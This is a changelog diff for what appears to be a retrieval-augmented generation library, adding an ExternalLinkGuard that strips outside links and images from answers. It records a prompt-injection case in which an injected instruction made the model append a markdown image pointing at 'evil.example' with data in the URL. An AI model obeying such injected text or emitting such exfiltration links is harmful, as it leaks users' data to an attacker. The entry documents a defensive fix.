@@ -3,7 +3,8 @@
 ## Unreleased
 
 **Behaviour changes vs 2.2, as they stand in this release.** Everything else is additive or opt-in.
-- **Always-on protections** (`secure_defaults=True`): citation access with `access_control`, a 10-call agent tool limit, and flag-only injection and secret checks.
+- **Always-on protections** (`secure_defaults=True`): citation access with `access_control`, a 10-call agent tool limit, flag-only injection and secret checks, and `ExternalLinkGuard`.
+  - **`ExternalLinkGuard` changes answers that link outside the sources:** markdown images and HTML tags that load a URL are removed, and links and bare URLs that are not in a retrieved source lose their URL (`[link removed]`). Found by a live test: an injected instruction made the model append `![log](https://evil.example/q?data=...)`, which a chat UI would fetch. Links to the sources are kept; trust more hosts with `ExternalLinkGuard(allow_domains=[...])`. Answers without such links are unchanged and leave no record.
   - Normal answers and sources are unchanged, and `result.guard_flags` is new.
   - With access control, streams trail the model by about one word.
   - Agents with `max_steps > 10` stop at 10 tool calls.
